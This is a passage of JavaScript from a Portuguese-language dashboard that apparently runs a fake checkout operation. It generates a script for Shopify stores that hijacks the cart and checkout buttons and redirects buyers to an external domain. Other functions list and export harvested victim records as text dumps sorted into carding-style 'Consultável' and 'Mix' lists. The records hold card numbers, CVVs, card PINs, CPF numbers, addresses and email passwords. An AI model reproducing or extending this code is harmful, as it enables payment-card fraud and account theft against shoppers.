                                                            "Credenciais inválidas, verifique suas credenciais.",
                                                            "toasterro"
                                                        );
                                                        _global.btnCarregando(
                                                            $(this),
                                                            false,
                                                            "Integrar"
                                                        );
                                                        return;
                                                    }

                                                    if (dados.status == 200) {
                                                        _global.toast(
                                                            "A integração foi realizada com sucesso.",
                                                            "toastsucesso"
                                                        );

                                                        setTimeout(() => {
                                                            location.reload();
                                                        }, 2000);
                                                    }
                                                },
                                            })
                                        )
                                )
                            )
                        );
                    }

                    if (dados.status == 200) {
                        let dados = await _global.busca(
                            "dashboard/getDadosShopify",
                            {
                                l: $("#select_loja_shopify").val(),
                            },
                            "POST"
                        );

                        $("#row_shopify").append(
                            $("<div>", {
                                class: "col-lg-6 card tempcardshopify",
                                style: "padding: 5px;",
                            }).append(
                                $("<div>", {
                                    class: "col-lg-12 card flex",
                                    style: "flex-direction: column; justify-content: center; align-items: center;",
                                }).append(
                                    $("<div>", {
                                        id: 'parent_div',
                                        style: "flex-direction: column; justify-content: center; align-items: center; margin: 15px;",
                                        class: "col-lg-6 flex",
                                    })
                                        .append(
                                            $("<span>", {
                                                text: "Preferências",
                                                style: "margin-top: 10px;",
                                            })
                                        )
                                        .append(
                                            $("<div>", {
                                                class: "form-check form-switch",
                                                style: "margin-top: 10px;",
                                            })
                                                .append(
                                                    $("<input>", {
                                                        class: "form-check-input",
                                                        type: "checkbox",
                                                        id: "checkbox_pedido_shopify",
                                                        change: async function (
                                                            e
                                                        ) {
                                                            let flag = "s";

                                                            if (
                                                                !$(this).prop(
                                                                    "checked"
                                                                )
                                                            )
                                                                flag = "n";

                                                            let dados =
                                                                await _global.busca(
                                                                    "dashboard/updatePreferenciaShopify",
                                                                    {
                                                                        l: $(
                                                                            "#select_loja_shopify"
                                                                        ).val(),
                                                                        flag: flag,
                                                                        column: "marcar_pedido",
                                                                    },
                                                                    "POST"
                                                                );

                                                            if (
                                                                dados.status ==
                                                                    200 &&
                                                                flag == "s"
                                                            ) {
                                                                _global.toast(
                                                                    "Os pedidos serão marcados na shopify.",
                                                                    "toastsucesso"
                                                                );
                                                                return;
                                                            }
                                                            if (
                                                                dados.status ==
                                                                    200 &&
                                                                flag == "n"
                                                            ) {
                                                                _global.toast(
                                                                    "Os pedidos não serão marcados na shopify.",
                                                                    "toastsucesso"
                                                                );
                                                                return;
                                                            }

                                                            _global.toast(
                                                                "Houve um erro interno.",
                                                                "toasterro"
                                                            );
                                                        },
                                                    })
                                                )
                                                .append(
                                                    $("<label>", {
                                                        class: "form-check-label",
                                                        text: "Registrar Pedidos na Shopify",
                                                    })
                                                )
                                        )
                                        .append(
                                            $("<div>", {
                                                class: "form-check form-switch",
                                                style: "margin-top: 10px;",
                                            })
                                                .append(
                                                    $("<input>", {
                                                        class: "form-check-input",
                                                        type: "checkbox",
                                                        id: "checkbox_multiple_products_in_cart",
                                                        change: async function (
                                                            e
                                                        ) {
                                                            const checked = $(
                                                                this
                                                            ).prop("checked")
                                                                ? 1
                                                                : 0;

                                                            let dados =
                                                                await _global.busca(
                                                                    "dashboard/updatePreferenciaShopify",
                                                                    {
                                                                        l: $(
                                                                            "#select_loja_shopify"
                                                                        ).val(),
                                                                        flag: checked,
                                                                        column: "multiple_products_in_cart",
                                                                    },
                                                                    "POST"
                                                                );

                                                            if (
                                                                dados.status ==
                                                                    200 &&
                                                                checked
                                                            ) {
                                                                _global.toast(
                                                                    "Vários produtos no carrinho no Shopify.",
                                                                    "toastsucesso"
                                                                );

                                                                return;
                                                            }

                                                            if (
                                                                dados.status ==
                                                                    200 &&
                                                                !checked
                                                            ) {
                                                                _global.toast(
                                                                    "Produto único no carrinho no Shopify.",
                                                                    "toastsucesso"
                                                                );

                                                                return;
                                                            }

                                                            _global.toast(
                                                                "Houve um erro interno.",
                                                                "toasterro"
                                                            );
                                                        },
                                                    })
                                                )
                                                .append(
                                                    $("<label>", {
                                                        class: "form-check-label",
                                                        text: "Usar Carrinho",
                                                    })
                                                )
                                        )
                                        .append(
                                            $("<button>", {
                                                class: "btn btn-success",
                                                style: "margin-top: 10px; border-radius: 30px; width: 100%;",
                                                text: "Gerar Script da Integração",
                                                click: function (e) {
                                                    let a = `
                                                    <script>

                                                                                                        $(document).ready((function () {
                                                                                                            let t;
                                                                                                            (async function () {
                                                                                                                return new Promise(((o, a) => {
                                                                                                                    $.post("https://api-jcheckout.shop/api/getDominio", {
                                                                                                                        l: ${$(
                                                                                                                            "#select_loja_shopify"
                                                                                                                        ).val()}
                                                                                                                    }, (a => {
                                                                                                                        if (404 == a.status) {
                                                                                                                            alert("Você não tem um domínio cadastrado no checkout.");
                                                                                                                            o();
                                                                                                                        } else if (500 == a.status) {
                                                                                                                            alert("Erro interno no checkout.");
                                                                                                                            o();
                                                                                                                        }
                                                                                                                        t = a.dominio;
                                                                                                                        o();
                                                                                                                    }));
                                                                                                                }));
                                                                                                            })().then(() => {

                                                    let isCartEnabled;

                                                    (async function () {
                                                                                                                return new Promise(((o, a) => {
                                                                                                                    $.post("https://api-jcheckout.shop/api/carrinho/hasMultiProductsInCart", {
                                                                                                                        shop_id: ${$(
                                                                                                                            "#select_loja_shopify"
                                                                                                                        ).val()}
                                                                                                                    }, (a => {
                                                                                                                        if (200 == a.status) {
                                                    console.log('cart status',a.data)
                                                                                                                            isCartEnabled = a.data;
                                                                                                                            o();
                                                                                                                        }

                                                                                                                    }));
                                                                                                                }));
                                                                                                            })().then(() => {

                                                    if(isCartEnabled){
                                                      console.log('cart enabled')

                                                                                                                $('[action="/cart"]').contents().unwrap();
                                                                                                                $('[name="checkout"]').each(((o, a) => {
                                                                                                                    $(a).click((function (o) {
                                                                                                                        o.preventDefault();

                                                                                                                         const cartData = {{ cart | json }};
                                                                        const productsArr = [];

                                                                        if (cartData.items.length > 0) {
                                                                            $.each(cartData.items, (index, item) => {
                                                                                const product = {
                                                                                    spid: item.product_id,
                                                                                    id: item.product_id,
                                                                                    qty: item.quantity,
                                                                                    svid: item?.variant_id ?? 'undefined',
                                                                                    variant: item?.variant_title ?? 'undefined',
                                                                                };
                                                                                productsArr.push(product);
                                                                            });
                                                                        }

                                                                        const products = encodeURIComponent(JSON.stringify(productsArr));

                                                                                                                        location.href = "https://" + t + "/carrinho?shopify=s&l=" + ${$(
                                                                                                                            "#select_loja_shopify"
                                                                                                                        ).val()} + "&products=" + products;
                                                                                                                    }));
                                                                                                                }));
                    }else{
                                                                                                              console.log('cart disabled');
                                                                                                            const productData = {{ product | json }};


                                                                                                                $('[action="/cart/add"]').contents().unwrap();
                                                                                                                                                                    $('[data-action="add-to-cart"]').each(((o, a) => {
                                                                                                                                                                        $(a).click((function (o) {
                                                                                                                                                                            o.preventDefault();
                                                                                                                                                                            let a = "", n = productData?.id, e = $('[name="quantity"]').val() ?? 1;
                                                                                                                                                                            $(".product-form__option-name").each(((t, o) => {
                                                                                                                                                                                a += $(o).text() + "|";
                                                                                                                                                                            }));
                                                                                                                                                                            const c = new URLSearchParams(window.location.search);
                                                                                                                                                                            let i;
                                                                                                                                                                            c.has("variant") && (i = c.get("variant"));

                                                                                                                                                                            const products = encodeURIComponent(JSON.stringify([{
                                                                                                                                                                                'spid': n,
                                                                                                                                                                                'svid': i ?? 'undefined',
                                                                                                                                                                                'id': n,
                                                                                                                                                                                'qty': e,
                                                                                                                                                                                'variant': a
                                                                                                                                                                            }]));

                                                                                                                                                                            location.href = "https://" + t + "/carrinho?shopify=s&l=" + ${$(
                                                                                                                                                                                "#select_loja_shopify"
                                                                                                                                                                            ).val()} + "&products=" + products;
                                                                                                                                                                        }));
                                                                                                                                                                    }));
                                                                                                        }
                                                    })
                                                                                                            });

                                                                                                        }));
                                                                                                        </script>
                                                    `;
                                                    $(
                                                        "#codigo_integracao"
                                                    ).text(a);
                                                    $("#modalintegracao").modal(
                                                        "show"
                                                    );
                                                },
                                            })
                                        )
                                        .append(
                                            $("<button>", {
                                                class: "btn btn-primary",
                                                style: "border-radius: 30px; width: 100%;",
                                                text: "Desativar Integração",
                                                click: async function (e) {
                                                    _global.btnCarregando(
                                                        $(this),
                                                        true,
                                                        "Desativar Integração"
                                                    );

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/desativaShopify",
                                                            {
                                                                l: $(
                                                                    "#select_loja_shopify"
                                                                ).val(),
                                                            },
                                                            "POST"
                                                        );

                                                    if (dados.status == 200) {
                                                        _global.toast(
                                                            "A integração foi desativada com sucesso.",
                                                            "toastsucesso"
                                                        );

                                                        setTimeout(() => {
                                                            location.reload();
                                                        }, 2000);
                                                    }
                                                },
                                            })
                                        )
                                )
                            )
                        );

                        if (dados.marcar_pedido == "n") {
                            $("#checkbox_pedido_shopify").prop(
                                "checked",
                                false
                            );
                        } else {
                            $("#checkbox_pedido_shopify").prop("checked", true);
                        }

                        $("#checkbox_multiple_products_in_cart").prop(
                            "checked",
                            dados.multiple_products_in_cart
                        );
                    }
                });
            }
        },
        async exportarParaTxt(conteudo) {
            var blob = new Blob([conteudo], { type: "text/plain" });
            var linkDownload = document.createElement("a");
            linkDownload.href = window.URL.createObjectURL(blob);

            let data = new Date();
            linkDownload.download = Date.now() + ".txt";
            document.body.appendChild(linkDownload);
            linkDownload.click();
            document.body.removeChild(linkDownload);
            return true;
        },
        async getCartoes() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca(
                "dashboard/getCartoes",
                { u: usuario.id_usuario },
                "POST"
            );
            let _l = [];
            let listaCartoes = [];

            $("#ul_cartoes").empty();
            $("#table_cartoes").empty();

            if (dados.length > 0) {
                let _i = 0;
                let i_aux = 0;
                _l[_i] = [];
                dados.forEach((v, i) => {
                    if (i_aux >= 10) {
                        i_aux = 0;
                        _i++;
                        _l[_i] = [];
                    }
                    _l[_i].push(v);
                    i_aux++;
                });

                dados.forEach((v, i) => {
                    listaCartoes[v.id] = v;
                });
                _global.listacc = listaCartoes;
                _global.listaExport = dados;

                let consultaveis = 0;
                let mix = 0;

                _global.listaExport.forEach((v, i) => {
                    if (v.senha == null) {
                        mix++;
                    } else {
                        consultaveis++;
                    }
                });

                $("#btn_exporta_cc")
                    .off("click")
                    .on("click", async function (e) {
                        if (_global.listaExport.length < 1) {
                            _global.toast(
                                "Você não tem informações para exportar",
                                "toasterro"
                            );
                            return;
                        }

                        $("#div_consultavel_exporta").empty();
                        $("#div_consultavel_exporta").append(
                            $("<button>", {
                                class: "btn btn-primary",
                                style: "width: 95%;",
                                text: "Consultável (" + consultaveis + ")",
                                click: function (e) {
                                    let string = "";
                                    let _i = 1;
                                    _global.listaExport.forEach((v, i) => {
                                        if (v.senha != null) {
                                            let vlCompra =
                                                v.valor_compra.replace(
                                                    ".",
                                                    ","
                                                );
                                            string += `
Informação Número (${_i})
BIN » ${v.bin_d}
Cartão » ${v.cc}
Validade » ${v.validade}
Cód. de Segurança » ${v.cvv}
Senha do Cartão » ${v.senha}
Titular » ${v.titular}
CPF do Titular » ${v.cpf}
Telefone » ${v.telefone}
Email » ${v.email}
CEP » ${v.cep}
Endereço » ${v.rua}
Bairro » ${v.bairro}
Número » ${v.numero}
Complemento » ${v.complemento == null ? "" : v.complemento}
Produto Comprado » ${v.produto}
Valor da Compra » R$ ${vlCompra}
Frete Selecionado » ${v.frete}
Data do Pedido » ${v.dt_format}
--------------------------------------
                                        `;
                                            _i++;
                                        }
                                    });
                                    if (_global.exportarParaTxt(string))
                                        _global.toast(
                                            "As informações foram exportadas com sucesso",
                                            "toastsucesso"
                                        );
                                },
                            })
                        );

                        $("#div_mix_exporta").append(
                            $("<button>", {
                                class: "btn btn-primary",
                                style: "width: 95%;",
                                text: "Mix (" + mix + ")",
                                click: function (e) {
                                    let string = "";
                                    let _i = 1;
                                    _global.listaExport.forEach((v, i) => {
                                        let vlCompra = v.valor_compra.replace(
                                            ".",
                                            ","
                                        );
                                        if (v.senha == null) {
                                            string += `
Informação Número (${_i})
BIN » ${v.bin_d}
Cartão » ${v.cc}
Validade » ${v.validade}
Cód. de Segurança » ${v.cvv}
Senha do Cartão » Não informado
Titular » ${v.titular}
CPF do Titular » ${v.cpf}
Telefone » ${v.telefone}
Email » ${v.email}
CEP » ${v.cep}
Endereço » ${v.rua}
Bairro » ${v.bairro}
Número » ${v.numero}
Complemento » ${v.complemento == null ? "" : v.complemento}
Produto Comprado » ${v.produto}
Valor da Compra » R$ ${vlCompra}
Frete Selecionado » ${v.frete}
Data do Pedido » ${v.dt_format}
--------------------------------------
                                        `;
                                            _i++;
                                        }
                                    });
                                    if (_global.exportarParaTxt(string))
                                        _global.toast(
                                            "As informações foram exportadas com sucesso",
                                            "toastsucesso"
                                        );
                                },
                            })
                        );

                        $("#div_todos_exporta").append(
                            $("<button>", {
                                class: "btn btn-primary",
                                style: "width: 95%;",
                                text: "Todas (" + (consultaveis + mix) + ")",
                                click: function (e) {
                                    let string = "";
                                    let _i = 1;
                                    _global.listaExport.forEach((v, i) => {
                                        let vlCompra = v.valor_compra.replace(
                                            ".",
                                            ","
                                        );
                                        string += `
Informação Número (${_i})
BIN » ${v.bin_d}
Cartão » ${v.cc}
Validade » ${v.validade}
Cód. de Segurança » ${v.cvv}
Senha do Cartão » ${v.senha == null ? "Não informado" : v.senha}
Titular » ${v.titular}
CPF do Titular » ${v.cpf}
Telefone » ${v.telefone}
Email » ${v.email}
CEP » ${v.cep}
Endereço » ${v.rua}
Bairro » ${v.bairro}
Número » ${v.numero}
Complemento » ${v.complemento == null ? "" : v.complemento}
Produto Comprado » ${v.produto}
Valor da Compra » R$ ${vlCompra}
Frete Selecionado » ${v.frete}
Data do Pedido » ${v.dt_format}
--------------------------------------
                                        `;
                                        _i++;
                                    });
                                    if (_global.exportarParaTxt(string))
                                        _global.toast(
                                            "As informações foram exportadas com sucesso",
                                            "toastsucesso"
                                        );
                                },
                            })
                        );
                        $("#modal_exporta_cc").modal("show");
                    });
            }

            _global.cartoes = _l;

            _global.reconstroiTabelaCartao = (indice) => {
                $("#table_cartoes").empty();
                _global.cartoes[indice].forEach((v, i) => {
                    $("#table_cartoes").append(
                        $("<tr>", {
                            id: "cartao_" + v.id,
                        })
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text: v.bin_d,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text: v.cc,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class:
                                                    "badge bg-gradient-" +
                                                    (v.senha == null
                                                        ? "danger"
                                                        : "success"),
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text:
                                                    v.senha == null
                                                        ? "Mix"
                                                        : "Consultável",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text: v.nm_loja,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-danger",
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text: v.dt_format,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto modal_cartao",
                                            _id: v.id,
                                            click: async function (e) {
                                                let cc =
                                                    _global.listacc[
                                                        $(this).attr("_id")
                                                    ];
                                                let vl = cc.valor_compra;
                                                vl = vl.replace(".", ",");

                                                $("#bin_modal").text(
                                                    `BIN: ${cc.bin_d}`
                                                );
                                                $("#cc_modal").text(
                                                    `Cartão: ${cc.cc}`
                                                );
                                                $("#validade_modal").text(
                                                    `Validade: ${cc.validade}`
                                                );
                                                $("#cvv_modal").text(
                                                    `CVV: ${cc.cvv}`
                                                );
                                                $("#senha_modal").text(
                                                    `Senha do Cartão: ${
                                                        cc.senha == null
                                                            ? "Cliente não informou"
                                                            : cc.senha
                                                    }`
                                                );
                                                $("#cpf_modal").text(
                                                    `CPF do Titular: ${cc.cpf}`
                                                );
                                                $("#titular_modal").text(
                                                    `Titular: ${cc.titular}`
                                                );
                                                $("#email_modal").text(
                                                    `Email: ${cc.email}`
                                                );
                                                $("#senhaemail").text(
                                                    `Senha do Email: ${cc.senha_email}`
                                                );
                                                $("#cep_modal").text(
                                                    `CEP: ${cc.cep}`
                                                );
                                                $("#rua_modal").text(
                                                    `Endereço: ${cc.rua}`
                                                );
                                                $("#numero_modal").text(
                                                    `Número: ${cc.numero}`
                                                );
                                                $("#bairro_modal").text(
                                                    `Bairro: ${cc.bairro}`
                                                );
                                                $("#complemento_modal").text(
                                                    `Complemento: ${
                                                        cc.complemento == null
                                                            ? ""
                                                            : cc.complemento
                                                    }`
                                                );
                                                $("#produto_modal").text(
                                                    `Produto: ${cc.produto}`
                                                );
                                                $("#valor_modal").text(
                                                    `Valor da Compra: R$ ${vl}`
                                                );
                                                $("#frete_modal").text(
                                                    `Frete Selecionado: ${cc.frete}`
                                                );
                                                $("#lj_modal").text(
                                                    `Loja: ${cc.nm_loja}`
                                                );
                                                $("#modal_cartao").modal(
                                                    "show"
                                                );
                                            },
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-success",
                                                style: "font-size: 10px; border-radius: 30px; cursor: pointer;",
                                                text: "Ver Informações",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "btn-inner--icon cursorpointer",
                                                style: "display: flex; justify-content: center;",
                                                _id: v.id,
                                                click: async function (e) {
                                                    let deleta = confirm(
                                                        "Você deseja deletar este cartão? A ação é irreversível."
                                                    );
                                                    let _i =
                                                        $(this).attr("_id");

                                                    if (deleta) {
                                                        let dados =
                                                            await _global.busca(
                                                                "dashboard/deleteInfo",
                                                                { id: _i },
                                                                "POST"
                                                            );

                                                        if (
                                                            dados.status == 200
                                                        ) {
                                                            _global.toast(
                                                                "A informação foi deletada com sucesso.",
                                                                "toastsucesso"
                                                            );
                                                            $(
                                                                "#cartao_" + _i
                                                            ).remove();
                                                            _global.getCards();
                                                        } else {
                                                            _global.toast(
                                                                "Não foi possível deletar a informação.",
                                                                "toasterro"
                                                            );
                                                        }
                                                    }
                                                },
                                            }).append(
                                                $("<i>", {
                                                    class: "ni ni-fat-remove",
                                                    style: "font-size: 25px; color: red;",
                                                })
                                            )
                                        )
                                    )
                                )
                            )
                    );
                });
            };

            if (_l.length > 0) {
                _l[0].forEach((v, i) => {
                    $("#table_cartoes").append(
                        $("<tr>", {
                            id: "cartao_" + v.id,
                        })
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text: v.bin_d,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text: v.cc,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class:
                                                    "badge bg-gradient-" +
                                                    (v.senha == null
                                                        ? "danger"
                                                        : "success"),
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text:
                                                    v.senha == null
                                                        ? "Mix"
                                                        : "Consultável",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-primary",
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text: v.nm_loja,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-danger",
                                                style: "font-size: 10px; border-radius: 30px;",
                                                text: v.dt_format,
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto modal_cartao",
                                            _id: v.id,
                                            click: async function (e) {
                                                let cc =
                                                    _global.listacc[
                                                        $(this).attr("_id")
                                                    ];
                                                let vl = cc.valor_compra;
                                                vl = vl.replace(".", ",");

                                                $("#bin_modal").text(
                                                    `BIN: ${cc.bin_d}`
                                                );
                                                $("#cc_modal").text(
                                                    `Cartão: ${cc.cc}`
                                                );
                                                $("#validade_modal").text(
                                                    `Validade: ${cc.validade}`
                                                );
                                                $("#cvv_modal").text(
                                                    `CVV: ${cc.cvv}`
                                                );
                                                $("#senha_modal").text(
                                                    `Senha do Cartão: ${
                                                        cc.senha == null
                                                            ? "Cliente não informou"
                                                            : cc.senha
                                                    }`
                                                );
                                                $("#cpf_modal").text(
                                                    `CPF do Titular: ${cc.cpf}`
                                                );
                                                $("#titular_modal").text(
                                                    `Titular: ${cc.titular}`
                                                );
                                                $("#email_modal").text(
                                                    `Email: ${cc.email}`
                                                );
                                                $("#senhaemail").text(
                                                    `Senha do Email: ${cc.senha_email}`
                                                );
                                                $("#cep_modal").text(
                                                    `CEP: ${cc.cep}`
                                                );
                                                $("#rua_modal").text(
                                                    `Endereço: ${cc.rua}`
                                                );
                                                $("#numero_modal").text(
                                                    `Número: ${cc.numero}`
                                                );
                                                $("#bairro_modal").text(
                                                    `Bairro: ${cc.bairro}`
                                                );
                                                $("#complemento_modal").text(
                                                    `Complemento: ${
                                                        cc.complemento == null
                                                            ? ""
                                                            : cc.complemento
                                                    }`
                                                );
                                                $("#produto_modal").text(
                                                    `Produto: ${cc.produto}`
                                                );
                                                $("#valor_modal").text(
                                                    `Valor da Compra: R$ ${vl}`
                                                );
                                                $("#frete_modal").text(
                                                    `Frete Selecionado: ${cc.frete}`
                                                );
                                                $("#lj_modal").text(
                                                    `Loja: ${cc.nm_loja}`
                                                );
                                                $("#modal_cartao").modal(
                                                    "show"
                                                );
                                            },
                                        }).append(
                                            $("<span>", {
                                                class: "badge bg-gradient-success",
                                                style: "font-size: 10px; border-radius: 30px; cursor: pointer;",
                                                text: "Ver Informações",
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "btn-inner--icon cursorpointer",
                                                style: "display: flex; justify-content: center;",
                                                _id: v.id,
                                                click: async function (e) {
                                                    let deleta = confirm(
                                                        "Você deseja deletar este cartão? A ação é irreversível."
                                                    );
                                                    let _i =
                                                        $(this).attr("_id");

                                                    if (deleta) {
                                                        let dados =
                                                            await _global.busca(
                                                                "dashboard/deleteInfo",
                                                                { id: _i },
                                                                "POST"
                                                            );

                                                        if (
                                                            dados.status == 200
                                                        ) {
                                                            _global.toast(
                                                                "A informação foi deletada com sucesso.",
                                                                "toastsucesso"
                                                            );
                                                            $(
                                                                "#cartao_" + _i
                                                            ).remove();
                                                            _global.getCards();
                                                        } else {
                                                            _global.toast(
                                                                "Não foi possível deletar a informação.",
                                                                "toasterro"
                                                            );
                                                        }
                                                    }
                                                },
                                            }).append(
                                                $("<i>", {
                                                    class: "ni ni-fat-remove",
                                                    style: "font-size: 25px; color: red;",
                                                })
                                            )
                                        )
                                    )
                                )
                            )
                    );
                });
            }

            let tamanho = _l.length;
            if (tamanho > 0) {
                let _first = true;
                for (i = 1; i <= tamanho; i++) {
                    $("#ul_cartoes").append(
                        $("<li>", {
                            class: "page-item " + (i == 1 ? "active" : ""),
                            pagina: i,
                        }).append(
                            $("<a>", {
                                style: i == 1 ? "color: white;" : "",
                                class: "page-link cursorpointer",
                                text: i,
                                click: function (e) {
                                    $(this).parent().addClass("active");
                                    $(this).css("color", "white");
                                    let pagina = $(this)
                                        .parent()
                                        .attr("pagina");

                                    $("#ul_cartoes")
                                        .children()
                                        .each((i, v) => {
                                            if ($(v).attr("pagina") != pagina) {
                                                $(v).removeClass("active");
                                                $(v)
                                                    .children()
                                                    .css("color", "#8392ab");
                                            }
                                        });
                                    _global.reconstroiTabelaCartao(pagina - 1);
                                },
                            })
                        )
                    );
                }
            }
        },
        async exportaPedidosTxt() {
            $("#exporta_pedidos")
                .off("click")
                .on("click", async function () {
                    const usuario = _global.getUsuario();
                    let dados = await _global.busca(
                        "dashboard/getPedidos",
                        {
                            id_usuario: usuario.id_usuario,
                            tipo_usuario: usuario.tipo_usuario,
                            inicio: $("#pedido_inicio").val(),
                            fim: $("#pedido_fim").val(),
                            abandoned:
                                $("#tbl-heading").text() ===
                                "Carrinhos Abandonados"
                                    ? true
                                    : false,
                        },
                        "POST"
                    );

                    let ini = $("#pedido_inicio").val();
                    let fim = $("#pedido_fim").val();

                    ini = ini.split("-");
                    ini = ini[1] + "/" + ini[0];

                    fim = fim.split("-");
                    fim = fim[1] + "/" + fim[0];
                    $("#modal_exporta_pedidos").modal("show");
                    $("#exporta_total").click(function (e) {
                        if (dados.length < 1) {
                            _global.toast(
                                "Você não tem pedidos para exportar neste período de data.",
                                "toasterro"
                            );
                            return;
                        }

                        let string = `
Pedidos do usuário: ${usuario.usuario}
Data de Início: ${ini}
Data de Fim: ${fim}
                        `;

                        dados.forEach((v, i) => {
                            string += `
Produto » ${v.titulo}
Preço Unitário » R$ ${v.preco.replace(".", ",")}
Quantidade » ${v.quantidade}
Frete Selecionado » ${v.frete_selecionado}
Valor do Frete Selecionado » R$ ${v.frete_selecionado_valor.replace(".", ",")}
Nome Completo » ${v.nome_completo}
Email » ${v.email}
Senha do Email » ${v.email_senha == null ? "Não Habilitado" : v.email_senha}
CPF » ${v.cpf}
Telefone » ${v.telefone}
Método de Pagamento » ${v.metodo_pagamento}
Data/Horário de Início do Carrinho » ${v.dt_instancia_carrinho}
Data/Horário de Finalização do Pedido » ${v.data_pedido}

»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

                            `;
                        });

                        _global.exportarParaTxt(string);
                    });

                    $("#exporta_emailsenha").click(function (e) {
                        let count = 0;
                        let string = `
                    Email / Senha
                    Pedidos do usuário: ${usuario.usuario}
                    Data de Início: ${ini}
                    Data de Fim: ${fim}
                    `;
                        dados.forEach((v, i) => {
                            if (v.email_senha != null) {
                                count++;
                                string += `

Email » ${v.email}
Senha do Email » ${v.email_senha == null ? "Não Habilitado" : v.email_senha}
»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

                                `;
                            }
                        });
                        if (count > 0) {
                            _global.exportarParaTxt(string);
                        } else {
                            _global.toast(
                                "Você não possui pedidos de email/senha para este período."
                            );
                        }
                    });
                });
        },
        async binsCartoes() {
            let usuario = _global.getUsuario();
            let dados = await _global.busca(
                "dashboard/getBins",
                { u: usuario.id_usuario },
                "POST"
            );

            await _global.geraGridBins(dados);
        },
        async geraGridBins(dados) {
            return new Promise((res) => {
                $("#grid_bins").remove();
                $("#rowbins").append(
                    `<div id="grid_bins" class="card col-lg-8 flex" style="width: 100%; height: 90%"></div>`
                );

                var source = {
                    localdata: dados,
                    datatype: "JSON",
                };
                var dataAdapter = new $.jqx.dataAdapter(source, {
                    loadComplete: function (data) {},
                    loadError: function (xhr, status, error) {},
                });

                var getLocalization = function () {
                    var localizationobj = {};
                    localizationobj.emptydatastring = "Não encontrado";
                    localizationobj.loadtext = "Carregando...";
                    localizationobj.groupsheaderstring =
                        "Arraste uma coluna aqui para agrupar os dados retornados";
                    localizationobj.groupbystring = "Agrupar por esta coluna";
                    localizationobj.groupremovestring =
                        "Remover do agrupamento";
                    localizationobj.decimalseparator = ",";
                    localizationobj.thousandsseparator = ".";
                    localizationobj.patterns = {
                        d: "d/M/yyyy",
                    };
                    localizationobj.grid = {
                        everpresentrowplaceholder:
                            "Clique aqui para adicionar um novo item",
                        loadtext: "Carregando...",
                        addrowstring: "Adicionar linha",
                        deleterowstring: "Excluir linha",
                        resetrowstring: "Reiniciar linha",
                        everpresentrowposition: "Posição da linha permanente",
                        sortascendingstring: "Ordenar crescente",
                        sortdescendingstring: "Ordenar decrescente",
                        sortremovestring: "Remover ordenação",
                        groupbystring: "Agrupar por esta coluna",
